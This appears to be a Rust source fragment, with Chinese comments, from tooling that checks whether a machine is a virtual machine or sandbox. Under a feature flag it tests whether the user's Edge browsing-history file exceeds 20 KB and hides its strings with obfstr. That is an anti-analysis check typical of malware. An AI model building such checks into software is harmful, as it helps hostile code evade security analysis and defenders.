// Edge浏览器历史检测：判断Edge历史文件是否大于20KB
#[cfg(feature = "vm_check_edge")]
pub fn check_edge() -> bool {
    use obfstr::obfstr;
    use std::env;
    use std::fs::metadata;
    use std::path::PathBuf;

    // 获取当前用户名
    let username = match env::var(obfstr!("USERNAME")) {
        Ok(u) => u,
        Err(_) => return false,
    };
    let mut path = PathBuf::from(obfstr!("C:\\Users"));
    path.push(&username);
    path.push(obfstr!(
        "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
    ));

    // 检查文件是否存在及大小
    if let Ok(meta) = metadata(&path) {
        if meta.len() > 20 * 1024 {
            return true;
        }
    }
    false
}
